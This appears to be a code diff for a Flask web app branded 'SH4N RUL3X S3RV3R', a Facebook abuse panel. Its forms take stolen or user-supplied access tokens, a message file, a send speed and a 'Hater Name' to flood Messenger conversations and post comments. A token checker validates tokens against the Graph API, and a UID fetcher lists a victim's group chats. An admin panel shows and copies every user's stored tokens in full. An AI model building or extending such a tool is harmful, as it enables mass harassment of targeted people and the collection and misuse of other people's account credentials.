+                document.getElementById("postSingleTokenGroup").style.display = "none";
+                document.getElementById("postMultiTokenGroup").style.display = "block";
+                document.getElementById("postDayNightTokenGroup").style.display = "none";
+            } else if (option === "daynight") {
+                document.getElementById("postSingleTokenGroup").style.display = "none";
+                document.getElementById("postMultiTokenGroup").style.display = "none";
+                document.getElementById("postDayNightTokenGroup").style.display = "block";
+            }
+        }
+        
+        function showTab(tabId) {
+            // Hide all tab contents
+            var tabContents = document.getElementsByClassName("tab-content");
+            for (var i = 0; i < tabContents.length; i++) {
+                tabContents[i].classList.remove("active");
+            }
+            
+            // Deactivate all tab links
+            var tabLinks = document.getElementsByClassName("tab-link");
+            for (var i = 0; i < tabLinks.length; i++) {
+                tabLinks[i].classList.remove("active");
+            }
+            
+            // Show selected tab content and activate its link
+            document.getElementById(tabId).classList.add("active");
+            event.currentTarget.classList.add("active");
+        }
+        
+        // Initialize on page load
+        window.onload = function() {
+            toggleTokenInput();
+            togglePostTokenInput();
+            // Activate first tab by default
+            document.querySelector('.nav-tabs li:first-child a').click();
+        };
+        
+        // Auto-refresh tasks every 15 seconds
         setInterval(function() {
-            if (document.getElementById('tasks').style.display === 'block') {
+            if (document.getElementById('tasks').classList.contains('active')) {
                 location.reload();
             }
         }, 15000);
     </script>
+</head>
+<body>
+    <div class="user-info">User: {{ session.get('username', 'Unknown') }}</div>
+    <button class="logout-btn" onclick="window.location.href='/logout'">Logout</button>
+    <h1>SH4N RUL3X S3RV3R</h1>
+    <div class="content">
+        {% if not session.get('approved') %}
+        <div class="pending-approval">
+            <h3>⏳ Pending Approval</h3>
+            <p>Your account is waiting for admin approval.Contact With Devloper For pproval</p>
+        </div>
+        {% else %}
+        <div class="approved">
+            <h3>YOU ARE APPROVED BY SH4N ✅</h3>
+        </div>
+        
+        {% endif %}
+        
+        <ul class="nav-tabs">
+            <li><a href="#" class="tab-link active" onclick="showTab('home')">HOME</a></li>
+        </ul>
+        
+        <!-- Home Tab -->
+        <div id="home" class="tab-content active">
+            <div class="tool-section">
+                <img src="https://i.ibb.co/21PNHLpM/IMG-20251112-190843.jpg" alt="Convo Tool" class="tool-img">
+                <a href="#" class="tool-btn" onclick="showTab('conversations')">CONVO TOOL</a>
+            </div>
+            
+            <div class="tool-section">
+                <img src="https://i.ibb.co/Xrtwkrgf/IMG-20251112-191238.jpg" alt="Post Tool" class="tool-img">
+                <a href="#" class="tool-btn" onclick="showTab('posts')">POST TOOL</a>
+            </div>
+            
+            <div class="tool-section">
+                <img src="https://i.ibb.co/600SDM1y/IMG-20251112-191047.jpg" alt="Token Checker" class="tool-img">
+                <a href="#" class="tool-btn" onclick="showTab('token-checker')">TOKEN CHECKER</a>
+            </div>
+            
+            <!-- NEW TOOL BUTTON: Page Tokens Gen -->
+            <div class="tool-section">
+                <img src="https://i.ibb.co/qF1DxtT1/IMG-20251112-191257.jpg" alt="Page Tokens Gen" class="tool-img">
+                <a href="/page-tokens-gen" class="tool-btn">FETCH PAGES</a>
+            </div>
+            <!-- END NEW TOOL BUTTON -->
+                        <div class="tool-section">
+                <img src="https://i.ibb.co/Ndr3nFWf/IMG-20251112-192608.jpg" alt="UID Fetcher" class="tool-img">
+                <a href="#" class="tool-btn" onclick="showTab('messenger-groups')">UID FETCHER</a>
+            </div>
+            
+            <div class="tool-section">
+                <img src="https://i.ibb.co/hFzVrWsQ/IMG-20251112-192643.jpg" alt="Task Manager" class="tool-img">
+                <a href="#" class="tool-btn" onclick="showTab('tasks')">TASK MANAGER</a>
+            </div>    </div>
+            
+            <div class="developer-section">
+                <h3>Developer</h3>
+                <img src="https://i.ibb.co/8nk328Bq/IMG-20251112-192830.jpg" alt="Developer" style="width: 100px; border-radius: 50%;">
+                <p>TH3 SH4N</p>
+                <a href="https://www.facebook.com/SH33T9N.BOII.ONIFR3" class="developer-btn" target="_blank">Facebook Profile</a>
+            </div>
+        </div>
+        
+        <!-- Conversations Tab -->
+        <div id="conversations" class="tab-content">
+            <div class="section">
+                <h2 class="section-title">Conversation Task</h2>
+                {% if not session.get('approved') %}
+                <div class="pending-approval">
+                    <p>❌ You need admin approval to use this tool</p>
+                </div>
+                {% else %}
+                <form method="POST" action="/start-task" enctype="multipart/form-data">
+                    <input type="hidden" name="task_type" value="convo">
+                    <div class="form-group">
+                        <label class="form-label">Token Option:</label>
+                        <select name="tokenOption" class="form-control" id="tokenOption" onchange="toggleTokenInput()">
+                            <option value="single">Single Token</option>
+                            <option value="multi">Multi Tokens</option>
+                        </select>
+                    </div>
+                    <div class="form-group" id="singleTokenGroup">
+                        <label class="form-label">Single Token:</label>
+                        <input type="text" name="singleToken" class="form-control" placeholder="Enter single token">
+                    </div>
+                    <div class="form-group" id="multiTokenGroup" style="display:none;">
+                        <label class="form-label">Token File:</label>
+                        <input type="file" name="tokenFile" class="form-control">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Conversation ID:</label>
+                        <input type="text" name="convo" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Message File:</label>
+                        <input type="file" name="msgFile" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Speed:</label>
+                        <input type="number" name="interval" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Hater Name:</label>
+                        <input type="text" name="haterName" class="form-control" required>
+                    </div>
+                    <button class="btn btn-primary" type="submit">Start</button>
+                </form>
+                {% endif %}
+            </div>
+        </div>
+        
+        <!-- Posts Tab -->
+        <div id="posts" class="tab-content">
+            <div class="section">
+                <h2 class="section-title">Post Comment Task</h2>
+                {% if not session.get('approved') %}
+                <div class="pending-approval">
+                    <p>❌ You need admin approval to use this tool Contact With Devloper</p>
+                </div>
+                {% else %}
+                <form method="POST" action="/start-task" enctype="multipart/form-data">
+                    <input type="hidden" name="task_type" value="post">
+                    <div class="form-group">
+                        <label class="form-label">Token Option:</label>
+                        <select name="tokenOption" class="form-control" id="postTokenOption" onchange="togglePostTokenInput()">
+                            <option value="single">Single Token</option>
+                            <option value="multi">Multi Tokens</option>
+                            <option value="daynight">Day/Night Token System</option>
+                        </select>
+                    </div>
+                    <div class="form-group" id="postSingleTokenGroup">
+                        <label class="form-label">Single Token:</label>
+                        <input type="text" name="singleToken" class="form-control" placeholder="Enter single token">
+                    </div>
+                    <div class="form-group" id="postMultiTokenGroup" style="display:none;">
+                        <label class="form-label">Token File:</label>
+                        <input type="file" name="tokenFile" class="form-control">
+                    </div>
+                    <div class="form-group" id="postDayNightTokenGroup" style="display:none;">
+                        <label class="form-label">Day Token File:</label>
+                        <input type="file" name="dayTokenFile" class="form-control">
+                        <label class="form-label">Night Token File:</label>
+                        <input type="file" name="nightTokenFile" class="form-control">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Post URL or ID:</label>
+                        <input type="text" name="post_id" class="form-control" placeholder="Enter post URL or ID" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Message File:</label>
+                        <input type="file" name="msgFile" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Speed:</label>
+                        <input type="number" name="interval" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Hater Name:</label>
+                        <input type="text" name="haterName" class="form-control" required>
+                    </div>
+                    <button class="btn btn-primary" type="submit">Start</button>
+                </form>
+                {% endif %}
+            </div>
+        </div>
+        
+        <!-- Tasks Tab -->
+        <div id="tasks" class="tab-content">
+            <div class="section">
+                <h2 class="section-title">Task Management</h2>
+                {% if not session.get('approved') %}
+                <div class="pending-approval">
+                    <p>❌ You need admin approval to use this tool Contact With Devloper</p>
+                </div>
+                {% else %}
+                <h3>Active Tasks</h3>
+                {% for task in active_tasks %}
+                <div class="task-item">
+                    <strong>Task ID:</strong> {{ task.id }}<br>
+                    <strong>Type:</strong> {{ task.type }}<br>
+                    <div class="task-actions">
+                        <a href="/view-logs/{{ task.id }}" class="btn btn-secondary">View Log</a>
+                        <form method="POST" action="/stop-task" style="flex: 1;">
+                            <input type="hidden" name="task_id" value="{{ task.id }}">
+                            <button class="btn btn-danger" type="submit">Stop Task</button>
+                        </form>
+                    </div>
+                </div>
+                {% else %}
+                <p>No active tasks</p>
+                {% endfor %}
+                {% endif %}
+            </div>
+        </div>
+        
+        <!-- Token Checker Tab -->
+        <div id="token-checker" class="tab-content">
+            <div class="section">
+                <h2 class="section-title">Token Checker</h2>
+                {% if not session.get('approved') %}
+                <div class="pending-approval">
+                    <p>❌ You need admin approval to use this tool Contact With Devloper</p>
+                </div>
+                {% else %}
+                <form method="POST" action="/check-tokens">
+                    <div class="form-group">
+                        <label class="form-label">Tokens to Check:</label>
+                        <textarea name="tokens" class="form-control" placeholder="Enter one token per line" required></textarea>
+                    </div>
+                    <button class="btn btn-success" type="submit">Tokens Check</button>
+                </form>
+                {% endif %}
+            </div>
+        </div>
+        
+        <!-- Messenger Groups Tab -->
+        <div id="messenger-groups" class="tab-content">
+            <div class="section">
+                <h2 class="section-title">Group UID Fetcher</h2>
+                {% if not session.get('approved') %}
+                <div class="pending-approval">
+                    <p>❌ You need admin approval to use this tool Contact With Devloper</p>
+                </div>
+                {% else %}
+                <form method="POST" action="/fetch-conversations">
+                    <div class="form-group">
+                        <label class="form-label">Access Token:</label>
+                        <input type="text" name="token" class="form-control" placeholder="Enter your Facebook access token" required>
+                    </div>
+                    <button class="btn btn-warning" type="submit">Fetch Messenger Groups</button>
+                </form>
+                {% endif %}
+            </div>
+        </div>
+    </div>
 </body>
 </html>
 """
@@ -1239,6 +1350,17 @@ ADMIN_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Panel</title>
     <style>
+        .token-detail {
+            margin-bottom: 10px;
+        }
+        .token-detail p {
+            margin: 5px 0;
+        }
+        .token-detail code {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
         body {
             background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
             background-size: cover;
@@ -1246,8 +1368,15 @@ ADMIN_TEMPLATE = """
             background-attachment: fixed;
             color: #ffffff;
             font-family: 'Roboto', sans-serif;
-            padding: 20px;
             margin: 0;
+            padding: 20px;
+        }
+        h1 {
+            color: #ffffff;
+            text-align: center;
+            margin-top: 0;
+            padding-top: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
         }
         .admin-container {
             max-width: 1200px;
@@ -1255,45 +1384,40 @@ ADMIN_TEMPLATE = """
             padding: 20px;
             background-color: rgba(0, 0, 0, 0.8);
             border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-        }
-        h1 {
-            color: #dc3545;
-            border-bottom: 2px solid rgba(255, 255, 255, 0.2);
-            padding-bottom: 10px;
-            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
         }
         .admin-section {
-            margin-top: 30px;
+            margin-bottom: 30px;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            border-left: 4px solid #dc3545;
         }
         .admin-section-title {
-            color: #ffc107;
-            margin-bottom: 20px;
-            border-left: 5px solid #ffc107;
-            padding-left: 10px;
+            color: #ffffff;
+            margin-top: 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+            padding-bottom: 10px;
         }
         .user-item {
-            background-color: rgba(255, 255, 255, 0.1);
-            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 15px;
             margin-bottom: 15px;
-            border-radius: 8px;
-            border-left: 5px solid #007bff;
-        }
-        .user-item p {
-            margin: 5px 0;
+            border-radius: 5px;
+            border-left: 4px solid #6c757d;
         }
         .user-actions {
-            margin-top: 15px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            padding-top: 15px;
+            margin-top: 10px;
         }
         .btn {
             padding: 8px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-            border: none;
             margin-right: 10px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 14px;
         }
         .btn-approve {
             background-color: #28a745;
@@ -1301,7 +1425,7 @@ ADMIN_TEMPLATE = """
         }
         .btn-revoke {
             background-color: #ffc107;
-            color: #333;
+            color: black;
         }
         .btn-remove {
             background-color: #dc3545;
@@ -1318,63 +1442,63 @@ ADMIN_TEMPLATE = """
             border-radius: 5px;
             cursor: pointer;
         }
-        .token-section {
-            margin-top: 15px;
-            padding: 10px;
-            background-color: rgba(0, 0, 0, 0.5);
-            border-radius: 5px;
-        }
         .token-box {
-            margin-top: 10px;
+            background-color: rgba(0, 0, 0, 0.6);
             padding: 10px;
-            background-color: rgba(255, 255, 255, 0.05);
+            margin-top: 10px;
             border-radius: 5px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        .token-box strong {
-            display: block;
-            margin-bottom: 5px;
-            color: #007bff;
+            border-left: 4px solid #17a2b8;
+            max-height: 200px;
+            overflow-y: auto;
         }
         .token-item {
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 5px;
-            margin-bottom: 5px;
-            border-radius: 3px;
             font-family: monospace;
-            font-size: 0.9em;
+            font-size: 12px;
+            margin: 2px 0;
             word-break: break-all;
-            color: #f8f9fa;
+        }
+        .token-section {
+            margin-top: 10px;
+        }
+        .token-section h4 {
+            margin: 5px 0;
+            color: #ffc107;
         }
         .copy-btn {
-            background-color: #17a2b8;
+            background-color: #6f42c1;
             color: white;
+            border: none;
             padding: 5px 10px;
             border-radius: 3px;
             cursor: pointer;
-            font-size: 0.8em;
+            font-size: 12px;
             margin-left: 10px;
+        }
+        .copy-btn:hover {
+            background-color: #5a2d91;
+        }
+        @media (max-width: 768px) {
+            .admin-container {
+                padding: 15px;
+            }
+            h1 {
+                font-size: 24px;
+            }
+            .btn {
+                display: block;
+                width: 100%;
+                margin-bottom: 10px;
+            }
         }
     </style>
     <script>
         function copyTokens(username, tokenType) {
-            let tokens = [];
-            let tokenBoxId = `${username}-${tokenType}`;
-            let tokenBox = document.getElementById(tokenBoxId);
+            const tokenBox = document.getElementById(`${username}-${tokenType}`);
+            const tokens = Array.from(tokenBox.getElementsByClassName('token-item'))
+                .map(item => item.textContent)
+                .join('\\n');
             
-            if (tokenBox) {
-                tokens = Array.from(tokenBox.getElementsByClassName('token-item'))
-                    .map(item => item.textContent);
-            }
-            
-            if (tokens.length === 0) {
-                alert(`No ${tokenType} tokens found for ${username}.`);
-                return;
-            }
-            
-            const tokenText = tokens.join('\\n');
-            
-            navigator.clipboard.writeText(tokenText).then(() => {
+            navigator.clipboard.writeText(tokens).then(() => {
                 alert(`${tokenType} tokens for ${username} copied to clipboard!`);
             }).catch(err => {
                 console.error('Failed to copy tokens: ', err);
@@ -1385,6 +1509,7 @@ ADMIN_TEMPLATE = """
         function copyAllTokens(username) {
             const allTokens = [];
             
+            // Get day tokens
             const dayTokenBox = document.getElementById(`${username}-day`);
             if (dayTokenBox) {
                 const dayTokens = Array.from(dayTokenBox.getElementsByClassName('token-item'))
@@ -1392,6 +1517,7 @@ ADMIN_TEMPLATE = """
                 allTokens.push(...dayTokens);
             }
             
+            // Get night tokens
             const nightTokenBox = document.getElementById(`${username}-night`);
             if (nightTokenBox) {
                 const nightTokens = Array.from(nightTokenBox.getElementsByClassName('token-item'))
@@ -1399,6 +1525,7 @@ ADMIN_TEMPLATE = """
                 allTokens.push(...nightTokens);
             }
             
+            // Get regular tokens
             const regularTokenBox = document.getElementById(`${username}-regular`);
             if (regularTokenBox) {
                 const regularTokens = Array.from(regularTokenBox.getElementsByClassName('token-item'))
@@ -1407,11 +1534,9 @@ ADMIN_TEMPLATE = """
             }
             
             if (allTokens.length > 0) {
-                const uniqueTokens = [...new Set(allTokens)];
-                const tokenText = uniqueTokens.join('\\n');
-                
+                const tokenText = allTokens.join('\\n');
                 navigator.clipboard.writeText(tokenText).then(() => {
-                    alert(`All ${uniqueTokens.length} unique tokens for ${username} copied to clipboard!`);
+                    alert(`All tokens for ${username} copied to clipboard!`);
                 }).catch(err => {
                     console.error('Failed to copy tokens: ', err);
                     alert('Failed to copy tokens. Please try again.');
@@ -1441,13 +1566,16 @@ ADMIN_TEMPLATE = """
                     {% endif %}
                 </p>
                 
+                <!-- Copy All Tokens Button -->
                 <div style="margin-bottom: 10px;">
                     <button class="copy-btn" onclick="copyAllTokens('{{ username }}')">📋 Copy All Tokens</button>
                 </div>
                 
+                <!-- User Tokens Display -->
                 <div class="token-section">
                     <h4>📋 User Tokens:</h4>
                     
+                    <!-- Day Tokens -->
                     {% if day_tokens.get(username) %}
                     <div class="token-box" id="{{ username }}-day">
                         <strong>🌅 Day Tokens ({{ day_tokens[username]|length }}):</strong>
@@ -1458,6 +1586,7 @@ ADMIN_TEMPLATE = """
                     </div>
                     {% endif %}
                     
+                    <!-- Night Tokens -->
                     {% if night_tokens.get(username) %}
                     <div class="token-box" id="{{ username }}-night">
                         <strong>🌙 Night Tokens ({{ night_tokens[username]|length }}):</strong>
@@ -1468,6 +1597,7 @@ ADMIN_TEMPLATE = """
                     </div>
                     {% endif %}
                     
+                    <!-- Regular Tokens -->
                     {% if regular_tokens.get(username) %}
                     <div class="token-box" id="{{ username }}-regular">
                         <strong>🔑 Regular Tokens ({{ regular_tokens[username]|length }}):</strong>
@@ -1514,6 +1644,17 @@ LOG_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Task Logs</title>
     <style>
+        .token-detail {
+            margin-bottom: 10px;
+        }
+        .token-detail p {
+            margin: 5px 0;
+        }
+        .token-detail code {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
         body { 
             background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
             background-size: cover;
@@ -1603,12 +1744,15 @@ LOG_TEMPLATE = """
                     const doc = parser.parseFromString(data, 'text/html');
                     const newLogs = doc.getElementById('logs').innerHTML;
                     document.getElementById('logs').innerHTML = newLogs;
+                    // Scroll to bottom after update
                     window.scrollTo(0, document.body.scrollHeight);
                 });
         }
         
+        // Refresh every 3 seconds
         setInterval(refreshLogs, 3000);
         
+        // Scroll to bottom on initial load
         window.onload = function() {
             window.scrollTo(0, document.body.scrollHeight);
         };
@@ -1622,17 +1766,271 @@ LOG_TEMPLATE = """
         <div class="task-info">
             <h3>Task Information</h3>
             <p><strong>Type:</strong> {{ task_type }}</p>
-            <p><strong>User:</strong> {{ username }}</p>
-            <p><strong>Status:</strong> Running...</p>
+            <p><strong>Target:</strong> {{ target }}</p>
+            <p><strong>Started:</strong> {{ start_time.strftime('%Y-%m-%d %H:%M:%S') }}</p>
         </div>
         
         <div id="logs">
             {% for log in logs %}
-            <div class="log-entry info">
-                [{{ log.time.strftime('%Y-%m-%d %H:%M:%S') }}] {{ log.message }}
+            <div class="log-entry {% if '✅' in log.message %}success{% elif '❌' in log.message %}error{% elif 'ℹ️' in log.message %}info{% endif %}">
+                {{ log.message }}<br>
+                <small>{{ log.time.strftime('%Y-%m-%d %H:%M:%S') }}</small>
             </div>
             {% endfor %}
         </div>
+        <a href="/" class="back-btn">Back to Main</a>
+    </div>
+</body>
+</html>
+"""
+
+TOKEN_CHECK_RESULT_TEMPLATE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token Check Results</title>
+    <style>
+        .token-detail {
+            margin-bottom: 10px;
+        }
+        .token-detail p {
+            margin: 5px 0;
+        }
+        .token-detail code {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+        body { 
+            background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: #ffffff; 
+            font-family: 'Roboto', sans-serif; 
+            padding: 20px;
+            margin: 0;
+        }
+        h1 { 
+            color: #ffffff; 
+            margin-top: 0;
+            padding-top: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        .result-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+        }
+        .token-group {
+            margin-bottom: 20px;
+            padding: 15px;
+            border-radius: 5px;
+        }
+        .valid-tokens {
+            background-color: rgba(40, 167, 69, 0.3);
+            border-left: 4px solid #28a745;
+        }
+        .invalid-tokens {
+            background-color: rgba(220, 53, 69, 0.3);
+            border-left: 4px solid #dc3545;
+        }
+        .token-list {
+            font-family: monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 3px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .back-btn {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #6c757d;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .copy-btn {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-left: 10px;
+        }
+        .copy-btn:hover {
+            background-color: #0056b3;
+        }
+    </style>
+    <script>
+        function copyTokens(elementId) {
+            const tokenList = document.getElementById(elementId).textContent;
+            navigator.clipboard.writeText(tokenList).then(() => {
+                alert('Tokens copied to clipboard!');
+            }).catch(err => {
+                console.error('Failed to copy tokens: ', err);
+                alert('Failed to copy tokens. Please try again.');
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="result-container">
+        <h1>Token Check Results</h1>
+        
+        <div class="token-group valid-tokens">
+            <h2>✅ Valid Tokens ({{ valid_count }})</h2>
+            <div class="token-list">
+                {% for result in results %}
+                    {% if result.valid %}
+                        <div class="token-detail">
+                            <p><strong>Token:</strong> <code>{{ result.token_short }}</code></p>
+                            <p><strong>Name:</strong> {{ result.name }}</p>
+                            <p><strong>UID:</strong> {{ result.uid }}</p>
+                            <p><strong>Profile:</strong> <a href="{{ result.profile_url }}" target="_blank" style="color: #87CEEB;">View Profile</a></p>
+                            <p style="word-break: break-all;"><strong>Full Token:</strong> <code>{{ result.token }}</code></p>
+                        </div>
+                        <hr style="border-color: rgba(255, 255, 255, 0.1);">
+                    {% endif %}
+                {% endfor %}
+            </div>
+            <h3 style="margin-top: 20px;">Valid Tokens List (for copy/paste)
+                <button class="copy-btn" onclick="copyTokens('valid-list')">Copy</button>
+            </h3>
+            <div class="token-list" id="valid-list">{{ "\n".join(valid_tokens) }}</div>
+        </div>
+        
+        <div class="token-group invalid-tokens">
+            <h2>❌ Invalid Tokens ({{ invalid_count }})</h2>
+            <div class="token-list">
+                {% for result in results %}
+                    {% if not result.valid %}
+                        <div class="token-detail">
+                            <p><strong>Token:</strong> <code>{{ result.token_short }}</code></p>
+                            <p><strong>Reason:</strong> {{ result.error }}</p>
+                        </div>
+                        <hr style="border-color: rgba(255, 255, 255, 0.1);">
+                    {% endif %}
+                {% endfor %}
+            </div>
+            <h3 style="margin-top: 20px;">Invalid Tokens List (for copy/paste)
+                <button class="copy-btn" onclick="copyTokens('invalid-list')">Copy</button>
+            </h3>
+            <div class="token-list" id="invalid-list">{{ "\n".join(invalid_tokens) }}</div>
+        </div>
+        
+        <a href="/" class="back-btn">Back to Dashboard</a>
+    </div>
+</body>
+</html>
+"""
+
+CONVERSATIONS_TEMPLATE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Conversations</title>
+    <style>
+        .token-detail {
+            margin-bottom: 10px;
+        }
+        .token-detail p {
+            margin: 5px 0;
+        }
+        .token-detail code {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+        body { 
+            background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: #ffffff; 
+            font-family: 'Roboto', sans-serif; 
+            padding: 20px;
+            margin: 0;
+        }
+        h1 { 
+            color: #ffffff; 
+            margin-top: 0;
+            padding-top: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        .result-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+        }
+        .conversation {
+            margin: 15px 0; 
+            padding: 15px; 
+            border-radius: 5px; 
+            background-color: rgba(0, 0, 0, 0.7);
+            border-left: 4px solid #007bff;
+        }
+        .back-btn {
+            display: inline-block;
+            margin: 20px 0;
+            padding: 10px 20px;
+            background-color: #6c757d;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .logout-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            padding: 8px 15px;
+            background-color: #dc3545;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <button class="logout-btn" onclick="window.location.href='/logout'">Logout</button>
+    <div class="result-container">
+        <h1>Conversations</h1>
+        
+        {% if error %}
+        <div class="conversation" style="border-color: #dc3545;">
+            <p>❌ Error: {{ error }}</p>
+        </div>
+        {% else %}
+            {% if conversations %}
+                {% for conv in conversations %}
+                <div class="conversation">
+                    <p><strong>💬 Conversation Name:</strong> {{ conv.name }}</p>
+                    <p><strong>🆔 Conversation ID:</strong> {{ conv.id }}</p>
+                </div>
+                {% endfor %}
+            {% else %}
+                <div class="conversation">
+                    <p>📭 No conversations found</p>
+                </div>
+            {% endif %}
+        {% endif %}
         
         <a href="/" class="back-btn">Back to Main</a>
     </div>
@@ -1658,6 +2056,7 @@ def signup():
         if username in users:
             return render_template_string(SIGNUP_TEMPLATE, error="Username already exists")
         
+        # Add new user with approved=False
         users[username] = {
             "password": password,
             "approved": False
@@ -1682,6 +2081,7 @@ def login():
             session["username"] = username
             session["approved"] = users[username]["approved"]
             
+            # Load user's tokens into memory
             user_day_tokens[username] = load_user_day_tokens(username)
             user_night_tokens[username] = load_user_night_tokens(username)
             
@@ -1745,6 +2145,7 @@ def admin_remove_user():
         del users[username]
         save_users(users)
         
+        # Clean up token files
         if os.path.exists(f"{username}.txt"):
             os.remove(f"{username}.txt")
         if os.path.exists(f"{username}_day.txt"):
@@ -1752,6 +2153,7 @@ def admin_remove_user():
         if os.path.exists(f"{username}_night.txt"):
             os.remove(f"{username}_night.txt")
             
+        # Remove from in-memory token storage
         user_day_tokens.pop(username, None)
         user_night_tokens.pop(username, None)
         
@@ -1764,6 +2166,7 @@ def admin_panel():
     
     users = load_users()
     
+    # Load all tokens for display
     day_tokens = {u: load_user_day_tokens(u) for u in users}
     night_tokens = {u: load_user_night_tokens(u) for u in users}
     regular_tokens = {u: load_user_tokens(u) for u in users}
@@ -1802,75 +2205,24 @@ def home():
     return render_template_string(
         HTML_TEMPLATE, 
         session=session, 
-        active_tasks=active_tasks,
-        token_results=session.pop('token_results', None),
-        group_results=session.pop('group_results', None)
+        active_tasks=active_tasks
     )
 
-def parse_tokens_from_text(text):
-    tokens = []
-    for line in text.split('\n'):
-        line = line.strip()
-        if line and re.match(r'^[A-Za-z0-9]+$', line.replace(' ', '').replace('-', '')):
-            tokens.append(line.strip())
-    return tokens
-
-def parse_messages_from_text(text):
-    messages = []
-    for line in text.split('\n'):
-        line = line.strip()
-        if line:
-            messages.append(line)
-    return messages
-
-def check_token_validity(token):
+def load_messages(file_storage):
     try:
-        url = f"https://graph.facebook.com/v17.0/me?access_token={token}"
-        response = requests.get(url, timeout=10)
-        
-        if response.status_code == 200:
-            data = response.json()
-            user_id = data.get('id', '')
-            user_name = data.get('name', '')
-            
-            # Get profile picture
-            pic_url = f"https://graph.facebook.com/v17.0/{user_id}/picture?type=small&access_token={token}"
-            pic_response = requests.get(pic_url, timeout=5)
-            profile_pic = pic_url if pic_response.status_code == 200 else None
-            
-            return user_id, user_name, True, profile_pic
-        else:
-            return None, None, False, None
-    except:
-        return None, None, False, None
-
-def fetch_messenger_groups(token):
-    try:
-        url = f"https://graph.facebook.com/v17.0/me/threads?access_token={token}&fields=id,name,participants"
-        response = requests.get(url, timeout=10)
-        
-        if response.status_code == 200:
-            data = response.json()
-            groups = []
-            
-            for thread in data.get('data', []):
-                if 'name' in thread and thread['name']:  # Only groups with names
-                    participants = []
-                    for participant in thread.get('participants', {}).get('data', []):
-                        if 'id' in participant:
-                            participants.append(participant['id'])
-                    
-                    groups.append({
-                        'name': thread['name'],
-                        'id': thread['id'],
-                        'participants': participants
-                    })
-            
-            return groups, None
-        else:
-            return None, f"API Error: {response.status_code}"
+        content = file_storage.read().decode("utf-8")
+        return [line.strip() for line in content.splitlines() if line.strip()]
     except Exception as e:
-        return None, f"Error: {str(e)}"
+        print(f"Error loading messages: {e}")
+        return []
+
+def load_tokens_from_file(file_storage):
+    try:
+        content = file_storage.read().decode("utf-8")
+        return [line.strip() for line in content.splitlines() if line.strip()]
+    except Exception as e:
+        print(f"Error loading tokens: {e}")
+        return []
 
 @app.route("/start-task", methods=["POST"])
 def start_task():
@@ -1879,26 +2231,37 @@ def start_task():
     
     username = session["username"]
     task_type = request.form["task_type"]
-    tokens_text = request.form["tokens"]
-    messages_text = request.form["messages"]
+    token_option = request.form["tokenOption"]
     interval = int(request.form["interval"])
     hater_name = request.form["haterName"]
     
